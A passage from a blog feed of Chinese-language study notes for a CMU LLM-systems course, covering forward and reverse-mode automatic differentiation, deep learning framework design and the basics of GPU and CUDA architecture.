class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前向评估跟踪（值）</span></span><br><span class="line">v1 = x1              <span class="comment"># = 2</span></span><br><span class="line">v2 = x2              <span class="comment"># = 5</span></span><br><span class="line">v3 = ln(v1)          <span class="comment"># = 0.693</span></span><br><span class="line">v4 = v1 * v2         <span class="comment"># = 10</span></span><br><span class="line">v5 = sin(v2)         <span class="comment"># = −0.959</span></span><br><span class="line">v6 = v3 + v4         <span class="comment"># = 10.693</span></span><br><span class="line">v7 = v6 − v5         <span class="comment"># = 11.652  →  y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前向 AD 跟踪（切线，种子用于 ∂/∂x₁）</span></span><br><span class="line">v1_dot = <span class="number">1</span>                            <span class="comment"># 种子</span></span><br><span class="line">v2_dot = <span class="number">0</span>                            <span class="comment"># 不对 x₂ 求导</span></span><br><span class="line">v3_dot = v1_dot / v1                  <span class="comment"># = 0.5   （ln 的链式法则）</span></span><br><span class="line">v4_dot = v1_dot*v2 + v2_dot*v1        <span class="comment"># = 5.0   （乘积法则）</span></span><br><span class="line">v5_dot = v2_dot * cos(v2)             <span class="comment"># = 0.0</span></span><br><span class="line">v6_dot = v3_dot + v4_dot              <span class="comment"># = 5.5</span></span><br><span class="line">v7_dot = v6_dot − v5_dot              <span class="comment"># = 5.5   →  ∂y/∂x₁</span></span><br></pre></td></tr></table></figure><h3 id="限制">限制</h3><p>要获得 ∂y/∂x₂，我们需要使用不同的种子（v̇₁=0,v̇₂=1）重新运行整个跟踪。对于具有数百万参数的网络，这代价高昂 —因此使用反向模式。</p><hr /><h2 id="反向模式自动微分">5. 反向模式自动微分</h2><p>反向模式 AD 是 PyTorch 中 <code>loss.backward()</code>的引擎。它在单次反向传递中计算相对于 <strong>所有</strong>输入的梯度。</p><h3 id="定义-1">定义</h3><p>定义每个节点 vᵢ 的 <strong>伴随</strong>：</p><p><span class="math display">\[\bar{v}_i = \frac{\partial y}{\partialv_i}\]</span></p><p>种子 v̄_output = 1，然后按 <strong>反向拓扑顺序</strong> 遍历图。</p><h3 id="示例相同函数">示例（相同函数）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向 AD 跟踪（伴随）</span></span><br><span class="line">v7_bar = <span class="number">1</span>                                   <span class="comment"># 种子: ∂y/∂y = 1</span></span><br><span class="line">v6_bar = v7_bar * <span class="number">1</span>                          <span class="comment"># ∂v7/∂v6 = 1  （减法）</span></span><br><span class="line">v5_bar = v7_bar * (-<span class="number">1</span>)                       <span class="comment"># ∂v7/∂v5 = −1</span></span><br><span class="line">v4_bar = v6_bar * <span class="number">1</span>                          <span class="comment"># ∂v6/∂v4 = 1  （加法）</span></span><br><span class="line">v3_bar = v6_bar * <span class="number">1</span>                          <span class="comment"># ∂v6/∂v3 = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有多个输出边的节点：求和贡献</span></span><br><span class="line">v2_bar = v5_bar * cos(v2) + v4_bar * v1      <span class="comment"># ≈ 1.716</span></span><br><span class="line">v1_bar = v4_bar * v2     + v3_bar / v1       <span class="comment"># = 5.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：∂y/∂x₁ = 5.5,  ∂y/∂x₂ ≈ 1.716  （一次传递中得到！）</span></span><br></pre></td></tr></table></figure><h3 id="多路径规则">多路径规则</h3><p>当节点 vᵢ 输入多个下游节点时，其伴随是部分贡献的<strong>和</strong>：</p><p><span class="math display">\[\bar{v}*i = \sum*{j \in \text{next}(i)}\bar{v}_j \cdot \frac{\partial v_j}{\partial v_i}\]</span></p><h3 id="反向-ad-算法">反向 AD 算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gradient</span>(<span class="params">out</span>):</span><br><span class="line">    node_to_grad = &#123;out: [<span class="number">1</span>]&#125;                  <span class="comment"># 种子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> reverse_topo_order(out):</span><br><span class="line">        v_bar_i = <span class="built_in">sum</span>(node_to_grad[i])         <span class="comment"># 求和部分伴随</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> inputs(i):</span><br><span class="line">            <span class="comment"># 计算部分伴随: v̄ᵢ · ∂vᵢ/∂vₖ</span></span><br><span class="line">            v_k_to_i = v_bar_i * local_grad(i, k)</span><br><span class="line">            node_to_grad[k].append(v_k_to_i)   <span class="comment"># 累加</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 输入的伴随</span><br></pre></td></tr></table></figure><hr /><h2 id="向量-雅可比乘积与张量伴随">6. 向量-雅可比乘积与张量伴随</h2><p>在实践中，节点持有<strong>张量</strong>（矩阵、向量），而不是标量。我们使用<strong>雅可比</strong> 和 <strong>VJP</strong> 进行推广。</p><h3 id="雅可比">雅可比</h3><p>对于 y ∈ ℝᵐ，x ∈ ℝⁿ： <span class="math display">\[J = \frac{\partial y}{\partial x} = \begin{bmatrix} \partialy_1/\partial x_1 &amp; \partial y_1/\partial x_2 \\ \partialy_2/\partial x_1 &amp; \partial y_2/\partial x_2 \end{bmatrix}\]</span> 我们 <strong>从不</strong> 显式形成J（它可能非常庞大）。相反，我们计算 <strong>向量-雅可比乘积(VJP)</strong>： <span class="math display">\[\bar{x} = J^T \bar{y}\]</span></p><h3 id="示例线性层">示例：线性层</h3><p>对于 <code>y = Wx</code>：</p><table><thead><tr class="header"><th>梯度</th><th>公式</th></tr></thead><tbody><tr class="odd"><td>相对于输入 x</td><td>x̄ = Wᵀ ȳ</td></tr><tr class="even"><td>相对于权重 W</td><td>W̄ = ȳ xᵀ</td></tr></tbody></table><blockquote><p><strong>实现模式：</strong> 每个原始操作都配有 <code>forward()</code>和 <code>vjp()</code>函数。框架只需知道这些原始操作；其他一切由图遍历处理。</p></blockquote><h2 id="反向传播与反向模式-ad图扩展">7. 反向传播与反向模式AD：图扩展</h2><p>有两种实现策略，这一区别对高阶导数很重要。</p><h3 id="反向传播第一代">反向传播（第一代）</h3><ul><li>直接在前向图上运行反向操作。</li><li>手动逐个节点计算伴随 <em>值</em>。</li><li>用于早期框架：Caffe、cuda-convnet。</li><li><strong>无法</strong> 自然支持梯度的梯度。</li></ul><h3 id="反向模式-ad-通过图扩展现代">反向模式 AD 通过图扩展（现代）</h3><ul><li><strong>为每个伴随计算构建新图节点</strong>。</li><li>反向传递本身成为计算图。</li><li>可以在其上运行另一次反向传递 → <strong>高阶导数</strong>。</li><li>被 PyTorch、JAX、现代 TensorFlow 使用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 梯度函数返回一个计算图，而不仅仅是一个值。</span></span><br><span class="line"><span class="comment"># 我们可以组合并再次求导：</span></span><br><span class="line"></span><br><span class="line">grad_fn    = grad(loss_fn)          <span class="comment"># 一阶梯度（一个图）</span></span><br><span class="line">hessian_fn = grad(grad_fn)          <span class="comment"># 二阶 — 对梯度求导！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JAX 使这一过程特别简洁：</span></span><br><span class="line"><span class="keyword">import</span> jax</span><br><span class="line">hessian = jax.grad(jax.grad(loss_fn))</span><br></pre></td></tr></table></figure><blockquote><p><strong>关键收获：</strong> 通过图扩展的反向模式 AD在功能上严格优于经典反向传播。这是现代框架能够计算Hessian、高阶梯度和元学习目标的原因。</p></blockquote><hr /><h2 id="整合深度学习框架">8. 整合：深度学习框架</h2><p>深度学习框架需要具备：<strong>表达性</strong>（任何网络架构）、<strong>生产力</strong>（隐藏CUDA，自动微分）和<strong>效率</strong>（可扩展到大型模型，自动硬件加速）。</p><h3 id="设计原则">设计原则</h3><ol type="1"><li><strong>定义</strong>程序为一个符号数据流图，包含占位符、变量和操作。</li><li><strong>执行</strong> 该图的优化版本在可用设备上。</li></ol><h3 id="基本组件tensorflow-风格">基本组件（TensorFlow 风格）</h3><table><colgroup><col style="width: 14%" /><col style="width: 50%" /><col style="width: 34%" /></colgroup><thead><tr class="header"><th>组件</th><th>角色</th><th>示例</th></tr></thead><tbody><tr class="odd"><td><strong>占位符</strong></td><td>在运行时输入数据</td><td><code>tf.placeholder(tf.float32, (1, 784))</code></td></tr><tr class="even"><td><strong>变量</strong></td><td>用于参数的有状态节点；在执行之间保持状态</td><td><code>tf.Variable(tf.zeros((100,)))</code></td></tr><tr class="odd"><td><strong>常量</strong></td><td>静态数据</td><td><code>tf.constant([[1, 2], [3, 4]])</code></td></tr><tr class="even"><td><strong>操作</strong></td><td>数学操作；必须定义前向 + 反向</td><td><code>tf.nn.relu(...)</code>, <code>tf.matmul(...)</code></td></tr><tr class="odd"><td><strong>会话</strong></td><td>将图绑定到设备（CPU/GPU）的执行上下文</td><td><code>tf.Session()</code></td></tr></tbody></table><h3 id="实现一个操作">实现一个操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AddOperation</span>(<span class="title class_ inherited__">Operation</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;定义加法操作：输出 = a + b&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__([a, b])       <span class="comment"># a, b 是输入节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, upstream_grad</span>):</span><br><span class="line">        <span class="comment"># ∂(a+b)/∂a = 1,  ∂(a+b)/∂b = 1</span></span><br><span class="line">        <span class="keyword">return</span> upstream_grad, upstream_grad</span><br></pre></td></tr></table></figure><h3 id="完整训练循环使用-autograd">完整训练循环（使用 AutoGrad）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义训练目标</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">objective</span>(<span class="params">params, <span class="built_in">iter</span></span>):</span><br><span class="line">    idx = batch_indices(<span class="built_in">iter</span>)</span><br><span class="line">    <span class="keyword">return</span> -log_posterior(params, train_images[idx], train_labels[idx], L2_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过自动微分获取梯度</span></span><br><span class="line">objective_grad = grad(objective)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 神经网络前向传递</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">neural_net_predict</span>(<span class="params">params, inputs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;params: (W, b) 元组的列表。inputs: (N x D) 矩阵。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> W, b <span class="keyword">in</span> params:</span><br><span class="line">        outputs = np.dot(inputs, W) + b</span><br><span class="line">        inputs  = np.tanh(outputs)</span><br><span class="line">    <span class="keyword">return</span> outputs - logsumexp(outputs, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对数后验 = 对数先验 + 对数似然</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_posterior</span>(<span class="params">params, inputs, targets, L2_reg</span>):</span><br><span class="line">    log_prior = -L2_reg * l2_norm(params)</span><br><span class="line">    log_lik   = np.<span class="built_in">sum</span>(neural_net_predict(params, inputs) * targets)</span><br><span class="line">    <span class="keyword">return</span> log_prior + log_lik</span><br></pre></td></tr></table></figure><h3 id="实现会话执行">实现会话（执行）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_session</span>(<span class="params">end_node, feed_dict</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行计算图。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> topological_sort(end_node):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, Placeholder):</span><br><span class="line">            node.value = feed_dict[node]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, (Variable, Constant)):</span><br><span class="line">            <span class="keyword">pass</span>                           <span class="comment"># 值已设置</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, Operation):</span><br><span class="line">            inputs = [n.value <span class="keyword">for</span> n <span class="keyword">in</span> node.input_nodes]</span><br><span class="line">            node.value = node.forward(*inputs)</span><br><span class="line">    <span class="keyword">return</span> end_node.value</span><br></pre></td></tr></table></figure><hr /><h2 id="框架比较pytorchtensorflowjax">9.框架比较：PyTorch、TensorFlow、JAX</h2><table><colgroup><col style="width: 17%" /><col style="width: 22%" /><col style="width: 24%" /><col style="width: 26%" /><col style="width: 10%" /></colgroup><thead><tr class="header"><th>方面</th><th>PyTorch</th><th>TensorFlow</th><th>JAX</th><th>NumPy</th></tr></thead><tbody><tr class="odd"><td><strong>范式</strong></td><td>动态（急切）</td><td>静态图 / 急切</td><td>函数式转换</td><td>过程式</td></tr><tr class="even"><td><strong>自动微分</strong></td><td>动态计算图</td><td>静态计算图</td><td>函数式（<code>grad</code>/<code>jit</code>）</td><td>无</td></tr><tr class="odd"><td><strong>硬件</strong></td><td>CPU、GPU、TPU</td><td>CPU、GPU、TPU</td><td>CPU、GPU、TPU</td><td>仅 CPU</td></tr><tr class="even"><td><strong>易用性</strong></td><td>Pythonic</td><td>学习曲线陡峭</td><td>Pythonic + 函数式</td><td>非常简单</td></tr><tr class="odd"><td><strong>并行性</strong></td><td><code>DataParallel</code> / DDP</td><td><code>tf.distribute</code></td><td><code>pmap</code></td><td>无</td></tr><tr class="even"><td><strong>生态系统</strong></td><td>Lightning, TorchVision</td><td>TensorBoard, TF Extended</td><td>与 NumPy 集成</td><td>—</td></tr></tbody></table><h3 id="动态与静态图">动态与静态图</h3><ul><li><strong>PyTorch（动态/急切）：</strong> 计算图在编写 Python代码时动态构建。使用标准打印语句易于调试。图可以在每次迭代中变化（例如，RNN中不同的序列长度）。</li><li><strong>TensorFlow v1（静态）：</strong> 首先 <em>定义</em>图，然后在会话中 <em>执行</em>。允许更激进的优化，但更难调试。</li><li><strong>JAX（函数式）：</strong>没有显式的图对象。你编写纯函数并使用转换（<code>jax.grad</code>、<code>jax.jit</code>、<code>jax.vmap</code>）来获取梯度、JIT编译和向量化。</li></ul><hr /><h2 id="梯度检查与调试">10. 梯度检查与调试</h2><p>在实现自定义反向传递时，数值梯度检查是你最好的朋友。</p><h3 id="中心有限差分">中心有限差分</h3><p><span class="math display">\[\frac{\partial f(x_1, x_2)}{\partialx_1} \approx \frac{f(x_1 + h, x_2) - f(x_1 - h, x_2)}{2h}\]</span></p><p>这比单边公式更准确（误差为 O(h²) 而不是 O(h)）。</p><h3 id="最佳实践">最佳实践</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 梯度检查步骤：</span></span><br><span class="line"><span class="comment"># 1. 使用双精度（float64） — float32 的误差占主导</span></span><br><span class="line"><span class="comment"># 2. 选择一个小的 h（例如，1e-6）</span></span><br><span class="line"><span class="comment"># 3. 通过图计算前向差分两次</span></span><br><span class="line"><span class="comment"># 4. 与你的解析梯度比较</span></span><br><span class="line"></span><br><span class="line">h = <span class="number">1e-6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numerical_grad</span>(<span class="params">f, x, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过中心差分计算 ∂f/∂xᵢ。&quot;&quot;&quot;</span></span><br><span class="line">    x_plus  = x.copy(); x_plus[i]  += h</span><br><span class="line">    x_minus = x.copy(); x_minus[i] -= h</span><br><span class="line">    <span class="keyword">return</span> (f(x_plus) - f(x_minus)) / (<span class="number">2</span> * h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更一般：选择一个随机方向 δ，检查方向导数</span></span><br><span class="line"><span class="comment"># δᵀ ∇f(θ) ≈ (f(θ + εδ) − f(θ − εδ)) / 2ε</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>提示：</strong> 如果你的解析梯度和数值梯度之间的差异超过~1e-5（相对误差），那么你的 VJP实现中可能存在错误。检查零输入和边界条件等边缘情况。</p></blockquote><hr /><h2 id="总结">总结</h2><table><colgroup><col style="width: 24%" /><col style="width: 75%" /></colgroup><thead><tr class="header"><th>概念</th><th>功能</th></tr></thead><tbody><tr class="odd"><td><strong>计算图</strong></td><td>表示程序的 DAG；使前向评估和反向微分成为可能</td></tr><tr class="even"><td><strong>拓扑排序</strong></td><td>定义图的有效执行顺序</td></tr><tr class="odd"><td><strong>前向模式 AD</strong></td><td>向前传播切线；对于 n 个输入，O(n) 次传递</td></tr><tr class="even"><td><strong>反向模式 AD</strong></td><td>向后传播伴随；对于标量输出，O(1) 次传递 — 高效训练的关键</td></tr><tr class="odd"><td><strong>VJP</strong></td><td>反向 AD 在张量上的原始操作；避免形成完整的雅可比</td></tr><tr class="even"><td><strong>图扩展</strong></td><td>现代技术：反向传递构建新图，支持高阶导数</td></tr><tr class="odd"><td><strong>深度学习框架</strong></td><td>结合：符号图定义 → 自动微分 → 在硬件上的优化执行</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 大语言模型系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> 11868 </tag>
            
            <tag> ML Systems </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> Auto Differentiation </tag>
            
            <tag> 15642 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys: GPU Programming &amp; Acceleration</title>
      <link href="/zh/2026/01/26/11868-LLM-Sys/11868-LLM-SyS-GPU-Programming-Acceleration/"/>
      <url>/zh/2026/01/26/11868-LLM-Sys/11868-LLM-SyS-GPU-Programming-Acceleration/</url>
      
        <content type="html"><![CDATA[<h1 id="gpu-编程">GPU 编程</h1><h2 id="神经网络层和低级操作">神经网络层和低级操作</h2><p>一个简单的前馈神经网络用于文本分类，由一系列标准层组成。输入文本首先通过<strong><u>嵌入层</u></strong> 映射为向量，然后是带有 <strong><u>ReLU激活</u></strong> 的 <strong><u>线性层</u></strong>。一个<strong><u>平均池化</u></strong>操作将标记表示聚合为一个单一向量，最后一个 <strong><u>softmax层</u></strong> 生成最终的类别概率。</p><p>在更低的层面，这些神经网络层是通过一小组基本操作实现的。<strong><u>矩阵乘法</u></strong>用于线性层，<u><strong>逐元素操作</strong></u> 处理激活，而<u><strong>归约操作</strong></u>（如平均）用于池化。这些操作的高效执行在很大程度上依赖于<u><strong>GPU</strong></u>。</p><h2 id="gpu-服务器的组成">GPU 服务器的组成</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125221821311.png" alt="image-20260125221821311" style="zoom:40%;" /></p><p>该图展示了一台现代的 4U 计算服务器，旨在处理高性能和 AI工作负载。它结合了双 AMD EPYC CPU 和 <strong><u>多个通过 PCIe 和 NVLink连接的 NVIDIA GPU</u></strong>，以及高带宽的 DDR5 内存和 NVMe存储，以支持大规模并行计算。</p><h2 id="gpu-架构">GPU 架构</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125221946137.png" alt="image-20260125221946137" style="zoom:40%;" /></p><p>现代 GPU 通过优先考虑 <strong>面向吞吐量的并行性</strong>而非单线程延迟来实现高性能。与 CPU 的少数复杂核心不同，GPU 由许多<strong>流式多处理器（SMs）</strong> 组成，每个 SM包含大量简单的计算核心，旨在并行执行相同的操作。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125222912708.png" alt="image-20260125222912708" style="zoom:70%;" /></p><p>SM 是 GPU 的基本执行单元。每个 SM 被分为<strong>四个分区</strong>，每个分区包含 <strong>32 个 CUDA核心</strong>，与 <strong>warp</strong> 的大小相匹配，warp 是 NVIDIA GPU中的基本调度和执行单元。一个 warp 由 <strong>32个线程在锁步中执行相同的指令</strong>（SIMT：单指令，多线程）。因此，单个SM 包含 <strong>128 个核心</strong>，在理想条件下每个周期可以执行多达<strong>128 个 FP32 操作</strong>。</p><p>在每个分区内，<strong>warp 调度器</strong> 每个周期选择一个准备好的warp，而 <strong>调度单元</strong>将其指令发给适当的执行单元（例如，FP32核心、张量核心或加载/存储单元）。GPU 不调度单个线程；相反，它们调度warp。当一个 warp 因内存访问而停滞时，调度器可以立即切换到另一个准备好的warp，几乎没有开销，从而使 GPU 能够通过大规模并发有效地<strong>隐藏内存延迟</strong>。</p><p>每个 SM 还包含一个大的<strong>寄存器文件</strong>（最快的片上存储）和一个共享的 <strong>L1缓存/共享内存</strong>，这使得线程之间能够快速重用数据和通信。像 NVIDIAH100 这样的新架构显著增加了L1/共享内存的容量，并增强了张量核心，进一步优化了 SM以满足深度学习工作负载中常见的大规模矩阵和张量计算。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125223615074.png" alt="image-20260125223615074" style="zoom:50%;" /></p><p>H100 引入了 FP8，以进一步提高吞吐量并减少大规模 AI工作负载的内存带宽需求。通过 <strong><u>支持多种 FP8格式并以更高精度累积结果</u></strong>，该架构实现了高性能和数值稳定性。</p><blockquote><p>Transformer Engine 是 H100中的一个硬件-软件协同设计系统，自动管理精度、缩放和累积，以安全地使用FP8 进行 Transformer 工作负载。</p></blockquote><p><strong>CPU 与 GPU</strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125223107120.png" alt="image-20260125223107120" style="zoom: 33%;" /></p><h2 id="在-gpu-上执行程序">在 GPU 上执行程序</h2><p>在 CUDA 编程模型中，<strong><u>CPU 作为主机控制执行并启动 GPU内核</u></strong>，而 <strong><u>GPU作为优化的大规模并行计算设备</u></strong>。内核使用 SIMT模型执行，其中线程被组织成块和网格，并映射到多个 SM 进行并行执行。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224122973.png" alt="image-20260125224122973" style="zoom: 33%;" /></p><h3 id="内核线程的执行方式">内核线程的执行方式</h3><p>当启动 CUDA 内核时，线程首先被组织成<strong>线程块</strong>，然后分配给<strong>流式多处理器（SMs）</strong>。在一个 SM 内，每个线程块进一步<strong>划分为 warp</strong>，<u><strong>warp</strong> 是 GPU用于创建、管理、调度和执行线程的基本单元。</u></p><p>一个 <strong>warp</strong> 由 <strong>32 个线程</strong>组成。所有线程在同一程序地址开始执行，但 <u>每个线程维护自己的<strong>程序计数器和寄存器状态</strong></u>。在任何给定周期，warp 在所有32 个线程中执行 <strong>一个共同的指令</strong>，遵循SIMT（单指令，多线程）执行模型。尽管 warp内的线程由于分支可以采取不同的控制流路径，但硬件会对分歧路径进行串行化，这可能会降低性能。</p><h3 id="sm-上的-warp-执行模型">SM 上的 Warp 执行模型</h3><p>一旦 warp 被分配给 SM，<u>其 <strong>执行上下文在整个 warp生命周期内保持驻留在 SM上</strong></u>。该上下文包括程序计数器、寄存器值和 warp使用的任何共享内存。由于所有活动的 warp都将其上下文保留在片上，<strong><u>在 warp之间切换不需要保存或恢复状态</u></strong>，使得 warp之间的上下文切换几乎是瞬时的。</p><p>在运行时，每个 SM 包含一个或多个 <strong>warp调度器</strong>，它们不断选择一个具有活动和准备线程的 warp。所选 warp的下一条指令随后被 <strong>发出（调度）</strong> 到适当的执行单元，例如FP32 核心、张量核心或加载/存储单元。如果一个 warp因长延迟操作（例如，全局内存访问）而停滞，调度器可以立即切换到另一个准备好的warp，从而允许 SM 通过并发隐藏内存延迟。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224641812.png" alt="image-20260125224641812" style="zoom:40%;" /></p><blockquote><p>尽管 NVIDIA GPU 暴露了 SIMT 编程模型，但 warp执行是通过硬件级别的带有预测和掩蔽的 SIMD 风格向量执行来实现的。</p></blockquote><h3 id="cpu-gpu-数据移动">CPU-GPU 数据移动</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224832439.png" alt="image-20260125224832439" style="zoom:33%;" /></p><h3 id="cuda-内核">CUDA 内核</h3><p>CUDA <strong>内核</strong> 是在 GPU上运行的函数。从编程的角度来看，内核描述了 <strong>单个线程</strong>的执行逻辑，代码本身是以 <strong>串行方式</strong>编写的。并行性并不是来自代码结构，而是来自于内核被大量线程同时执行的事实。</p><p>当内核被启动时，<strong>成千上万的线程</strong>可能会同时执行相同的内核函数。每个线程使用其<strong>线程索引</strong>（例如，<code>threadIdx</code>，<code>blockIdx</code>）来确定其操作的数据部分。这遵循SPMD（单程序，多数据）模型：相同的程序在许多线程中复制，每个线程处理不同的数据元素。</p><p>CUDA 内核的关键特性：</p><ul><li>内核代码是 <strong>每个线程串行的</strong></li><li>通过 <strong>许多线程执行相同内核</strong> 实现大规模并行性</li><li>线程索引用于将线程映射到数据</li><li>程序员表达 <em>一个线程做什么</em>，而不是线程如何被调度</li></ul><h3 id="编译-cuda-代码">编译 CUDA 代码</h3><p>CUDA 程序遵循 <strong>异构编程模型</strong>，其中 <u>单个源文件包含<strong>主机（CPU）</strong> 代码和 <strong>设备（GPU）</strong>代码。</u> CUDA 编译器 <strong>NVCC</strong>作为编译驱动程序，分别处理这两部分并以不同方式编译它们。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125225428030.png" alt="image-20260125225428030" style="zoom:50%;" /></p><p>在编译期间：</p><ul><li><strong>主机代码</strong> 被传递给标准 C/C++编译器（例如，<code>gcc</code> 或 <code>clang</code>），并编译为 CPU可执行代码。</li><li><strong>设备代码</strong>（CUDA 内核）被编译为<strong>PTX</strong>，这是 NVIDIA GPU 的中间表示。</li></ul><p>在运行时，PTX 代码由 NVIDIA 驱动程序 <strong>即时编译（JIT）</strong>为特定于目标 GPU 架构的机器代码。这种设计允许相同的 CUDA二进制文件在不同的 GPU 代上运行，而无需重新编译源代码。</p><blockquote><p>PTX 作为中间表示，而不是最终的机器代码。在运行时，NVIDIA 驱动程序将PTX JIT 编译为特定于架构的 GPU 指令，从而使相同的 CUDA二进制文件能够在不同的 GPU 代上运行。</p></blockquote><h2 id="基本-gpu-cuda-操作">基本 GPU CUDA 操作</h2><p>在 CUDA 中，所有 GPU 操作由 CPU 协调。主机显式地使用<code>cudaMalloc</code> 分配设备内存，使用 <code>cudaMemcpy</code>在主机和设备之间传输数据，启动 GPU 内核，最后使用 <code>cudaFree</code>释放设备内存。这种显式的内存管理模型反映了 CUDA 的异构设计，其中 GPU作为由 CPU 控制的计算加速器。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125230332427.png" alt="image-20260125230332427" style="zoom:33%;" /></p><h3 id="gpu-内存">GPU 内存</h3><p>CUDA 提供了一个分层内存模型。每个线程都有<strong>私有寄存器</strong>，这是访问速度最快的内存。</p><p>同一 <strong>线程块</strong> 内的线程可以通过<strong><u>共享内存</u></strong> 进行通信，使用 <code>__shared__</code>显式声明，延迟远低于全局内存。</p><p>相比之下，<strong><u>全局内存</u></strong>可被所有线程访问，并在内核启动之间持续存在，但访问延迟最高。</p><h3 id="数据移动">数据移动</h3><p>CPU 和 GPU 之间的数据移动由程序员使用 <code>cudaMemcpy</code>显式管理。内存可以 <strong>从主机到设备</strong> 或<strong>从设备到主机</strong> 复制，传输大小以字节为单位指定。由于CPU-GPU 